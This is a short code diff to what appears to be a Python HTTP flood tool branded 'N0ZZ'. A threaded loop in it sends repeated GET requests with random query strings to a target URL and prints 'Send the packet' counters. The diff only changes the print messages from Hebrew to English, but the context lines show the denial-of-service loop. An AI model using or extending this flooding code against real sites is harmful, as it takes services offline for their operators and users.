@@ -93,11 +93,9 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 u += 1
-                print("[💥]  \033[96mN0ZZ:  \033[96m " +str(u)+ "  \033[92mשלח את החבילה אל\033[32m   " +url+ "\033[0m" )
-                print("[💥]  \033[33mN0ZZ:  \033[32m " +str(u)+ "  \033[32mשלח את החבילה אל\033[34m   " +url+ "\033[0m" )
-            
+                print("[🚀]  \033[96mN0ZZ --> \033[33m " +str(u)+ "   \033[32mSend the packet  \033[37m " +url+ "\033[0m" )      
             except requests.exceptions.ConnectionError:
-                print("[🚀]  \033[33mN0ZZ:  \033[95m " +str(u)+ "   \033[32mSend the packet  \033[34m " +url+ "\033[0m" )
+                print("[🚀]  \033[33mN0ZZ --> \033[95m " +str(u)+ "   \033[94mSend the packet  \033[93m " +url+ "\033[0m" )
                       
                 pass
             except requests.exceptions.InvalidSchema:
